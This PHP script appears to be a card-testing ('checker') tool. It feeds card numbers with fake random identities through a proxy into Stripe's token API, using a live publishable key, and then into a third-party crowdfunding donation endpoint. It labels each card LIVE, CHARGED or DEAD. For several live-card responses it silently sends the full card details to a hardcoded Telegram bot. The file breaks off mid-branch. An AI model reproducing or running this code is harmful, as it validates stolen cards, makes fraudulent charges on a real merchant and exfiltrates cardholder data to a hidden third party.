<?php 



error_reporting(0);

date_default_timezone_set('America/New_York');



if ($_SERVER['REQUEST_METHOD'] == "POST") {

    extract($_POST);

} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {

    extract($_GET);

}

function GetStr($string, $start, $end) {

    $str = explode($start, $string);

    $str = explode($end, $str[1]);  

    return $str[0];

}

function inStr($string, $start, $end, $value) {

    $str = explode($start, $string);

    $str = explode($end, $str[$value]);

    return $str[0];

}

$separa = explode("|", $lista);

$cc = $separa[0];

$mes = $separa[1];

$ano = $separa[2];

$cvv = $separa[3];




//==================[Randomizing Details]======================//

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');

preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);

$name = $matches1[1][0];

preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);

$last = $matches1[1][0];

preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);

$email = $matches1[1][0];

preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);

$street = $matches1[1][0];

preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);

$city = $matches1[1][0];

preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);

$state = $matches1[1][0];

preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);

$phone = $matches1[1][0];

preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);

$postcode = $matches1[1][0]; 




#---/// Proxy\\\---#

//////////======= Hydra Proxy


 



$ip = $_GET['ip']; 
$pass = $_GET['pass']; 
$ema = $_GET['ema'];
if (empty($ema)) { $ema = $email;
}
$amt = $_GET['amt'];
if (empty($amt)) { $amt = '1';
}

////////PROXY////////

// split IP and port
$ip_parts = explode(':', $ip);
$proxy_server = $ip_parts[0];
$proxy_port = $ip_parts[1];

// split username and password
$pass_parts = explode(':', $pass);
$proxy_username = $pass_parts[0];
$proxy_password = $pass_parts[1];

#---///Proxy Check\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ip.nf/me.json');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_server);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_username . ':' . $proxy_password);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
$ips = curl_exec($ch);
curl_close($ch);

$ip1 = GetStr($ips, '"ip":"', '"');





////////////////////////////===[0 Req]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6'); 
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxy_server);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_username . ':' . $proxy_password);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_HTTPHEADER, array( 
'Host: m.stripe.com', 
'User-Agent: Mozilla/5.0 (Android 13; Mobile; rv:68.0) Gecko/68.0 Firefox/105.0', 
'Accept: */*', 
'Accept-Language: en-US,en;q=0.5', 
'Content-Type: text/plain;charset=UTF-8', 
'Origin: https://m.stripe.network', 
'Connection: keep-alive', 
'Referer: https://m.stripe.network/inner.html')); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt'); 
curl_setopt($ch, CURLOPT_POSTFIELDS, ""); 
$rand = curl_exec($ch); 
curl_close($ch);
$muid = trim(strip_tags(getStr($rand,'"muid":"','"'))); 
$sid = trim(strip_tags(getStr($rand,'"sid":"','"'))); 
$guid = trim(strip_tags(getStr($rand,'"guid":"','"')));

curl_close($ch);


////////////////////////////===[1 Req]



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_PROXY, $proxy_server);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_username . ':' . $proxy_password);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: api.stripe.com',
    'method: POST',
    'path: /v1/tokens',
    'scheme: https',
    'accept: */*',
    'accept-language: en-US,en;q=0.9',
    'authorization: Bearer pk_live_T8SuhiCRN5AJKKJpOu4TO5p5',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://fundist-rebel-news.herokuapp.com',
    'referer: https://fundist-rebel-news.herokuapp.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'stripe-version: 2020-08-27',
    'user-agent: Mozilla/5.0 (Linux; Android 10; IN2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
));

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

// Postfields
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'%20'.$last.'&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[address_state]='.$state.'&card[address_zip]='.$postcode.'&card[address_country]=US');

$result1 = curl_exec($ch);

curl_close($ch);

$id = trim(strip_tags(getStr($result1,'"id": "','"')));
$secret = trim(strip_tags(getStr($result1,'"client_secret": "','"')));



////////////////////////////===[2 Req]




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://fundist-rebel-news.herokuapp.com/transaction/card');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_server);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_username . ':' . $proxy_password);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: fundist-rebel-news.herokuapp.com',
    'method: POST',
    'path: /transaction/card',
    'scheme: https',
    'accept: */*',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'Cookie: __stripe_mid='.$muid.'; __stripe_sid='.$sid.'',
    'origin: https://fundist-rebel-news.herokuapp.com',
    'referer: https://fundist-rebel-news.herokuapp.com/form/?iframe=1&tag=ftf_australia_fundist&title=Donate+Now&subtitle=We+are+crowdfunding+lawyers+for+Australians+who+want+to+fight+their+outrageous+pandemic+tickets.&image=https://assets.nationbuilder.com/therebel/pages/55816/attachments/original/1638980965/ftf_australia_fundist.jpg?1638980965&amounts=27,55,100,250,500,1000,5000&amount=100&currency=aud&country_code=au&goal=1500',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 10; IN2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
));


curl_setopt($ch, CURLOPT_POST, 1);


curl_setopt($ch, CURLOPT_POSTFIELDS,'{"payment":"'.$id.'","transaction":{"tag":"ftf_australia_fundist","currency":"USD","amount":"'.$amt.'"},"user":{"first_name":"'.$name.'","last_name":"'.$last.'","email":"'.$ema.'","country_code":"US","province":"'.$state.'","postal_code":"'.$postcode.'"}}');

$result2 = curl_exec($ch);

curl_close($ch);

$token = trim(strip_tags(getStr($result2, '"id": "', '"')));




////////////////////////////===[BIN Info]



$cctwo = substr("$cc", 0, 6);



$ch = curl_init();





curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');

curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);

curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: lookup.binlist.net',

'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',

'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'

));

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_POSTFIELDS, '');

$fim = curl_exec($ch);

$fim = json_decode($fim,true);

$bank = $fim['bank']['name'];

$country = $fim['country']['name'];

$emoji = $fim['country']['emoji'];

$type = $fim['type'];

curl_close($ch);

if(strpos($fim, '"type":"credit"') !== false) {

  $type = 'Credit';

} else {

  $type = 'Debit';

}

$forwardd="https://api.telegram.org/bot5840499121:AAFTcp_uvRPC9tgZVdmOMf_2TCCR_IFypWc/sendMessage?chat_id=5624135698&text=*✅𝗟𝗜𝗩𝗘 𝗖𝗖𝗡 𝗕𝗢𝗧 𝗕𝗬 𝗦𝗬𝗡𝗭𝗫* `$lista`&parse_mode=MarkDown";

////////////////////////////===[Responses]===////////////////////////////



if

(strpos($result1,  '"cvc_check": "pass"')) {

  echo "<font size=2 color='white'>  <font class='badge badge-success'>#LIVE $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV/CCN MATCHED [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  'Confirmed')) {

  echo "<font size=2 color='white'>  <font class='badge badge-success'>#CHARGED $1 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV/CCN MATCHED [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}

elseif

(strpos($result2,  '"Membership Confirmation."')) {

  echo "<font size=2 color='white'>  <font class='badge badge-success'>#LIVE/CCN $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CHARGED $amt [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "Donation Complete.")) {

  echo "<font size=2 color='white'>  <font class='badge badge-success'>#CHARGED 1$ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV/CCN MATCHED [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  'Your card zip code is incorrect.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-success'>#LIVE $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV/CCN MATCHED [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

} 

elseif

(strpos($result2,  '/donations/thank_you?donation_number=')) {

  echo "<font size=2 color='white'>  <font class='badge badge-success'>#LIVE $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV/CCN MATCHED [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}





elseif

(strpos($result2,  'insufficient funds')) {

  echo "<font size=2 color='white'>  <font class='badge badge-success'>#LIVE  $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>INSUFFICIENT FUNDS  [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}





elseif

(strpos($result2,  '"type":"one-time"')) {

  echo "<font size=2 color='white'>  <font class='badge badge-success'>#LIVE $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVV/CCN MATCHED Incorrect zip  [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  'security code is incorrect.')) {
    
    file_get_contents($forwardd);

  echo "<font size=2 color='white'>  <font class='badge badge-info'>#LIVE $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='black'><font class='badge badge-light'>SECURITY CODE IS INCORRECT  [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  'security code is not correct.')) {
    
    file_get_contents($forwardd);

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  "Your card's security code is invalid.")) {
    
    file_get_contents($forwardd);

  echo "<font size=2 color='white'>  <font class='badge badge-info'>#LIVE $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='black'><font class='badge badge-light'>SECURITY CODE IS INCORRECT  [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  "incorrect_cvc")) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "stolen_card")) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "lost_card")) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result3,  'Your card has insufficient funds.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  "pickup_card")) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "insufficient_funds")) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  '"cvc_check": "fail"')) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  'security code is invalid.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
    

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "incorrect_cvc")) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CCN LIVE [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "stolen_card")) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen_Card [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "lost_card")) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>lost_card [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  'Your card has insufficient funds.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient funds [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  "pickup_card")) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card_Card [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result3,  "insufficient_funds")) {

  echo "<font size=2 color='white'>  <font class='badge badge-info'>Aprovada ⍄1�7 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>insufficient_funds [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  'card has expired.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  'Your card number is incorrect.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  "incorrect_number")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}





elseif

(strpos($result2,  'card was declined.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'>#DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}


elseif

(strpos($result2,'Invalid account.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'>#DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Invalid Account [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}


elseif

(strpos($result2,  "Error creating payment intent with Stripe. Please try again.")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic_Decline [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "do_not_honor")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do_Not_Honor [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}





elseif

(strpos($result2,  "expired_card")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  'does not support this type of purchase.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-success'> #LIVE $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  'Invalid account.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>INVALID ACCOUNT [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2, "service_not_allowed")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  '"cvc_check": "unchecked"')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  '"cvc_check": "unavailable"')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "parameter_invalid_empty")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined : Missing Card Details [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "lock_timeout")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process : Card Not Checked [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  "transaction_not_allowed")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support Purchase [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2, "three_d_secure_redirect")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2, "missing_payment_information")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2, "Payment cannot be processed, missing credit card number")) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br>";

}



elseif

(strpos($result2,  'Your card has expired.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  'card number is incorrect.')) {

  echo "<font size=2 color='white'>  <font class='badge badge-danger'> #DEAD $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number [  𝙎 𝙔 𝙉 𝙕 𝙓 ] </i></font><br> <font class='badge badge-primary'>$bank [$country] - $type</i></font><br><font class='badge badge-success'>[$ip1]</i></font><br>";

}



elseif

(strpos($result2,  "incorrect_number")) {

